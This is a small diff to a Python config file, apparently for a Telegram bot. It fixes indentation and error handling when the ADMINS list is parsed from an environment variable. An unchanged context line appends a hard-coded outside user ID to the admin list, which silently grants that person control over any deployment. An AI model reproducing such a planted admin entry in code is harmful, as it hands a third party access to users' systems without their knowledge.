@@ -60,12 +60,13 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True
 BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = "<b>ɢɪᴠᴇ ᴍᴇ ᴏɴᴇ ʙɪʟʟɪᴏɴ ʙᴇʀʀɪᴇꜱ ᴀɴᴅ ɪ ᴡɪʟʟ ꜱᴛᴀʀᴛ ᴡᴏʀᴋɪɴɢ ꜰᴏʀ ʏᴏᴜ... ɴᴇxᴛ ᴏᴡɴᴇʀ</b>"
 
-    ADMINS = []
+ADMINS = []
 
-    for x in (os.environ.get("ADMINS", "").split()):
+try:
+    for x in os.environ.get("ADMINS", "").split():
         ADMINS.append(int(x))
 except ValueError:
-        raise Exception("Your Admins list does not contain valid integers.")
+    raise Exception("Your Admins list does not contain valid integers.")
 
 ADMINS.append(OWNER_ID)
 ADMINS.append(1250450587)
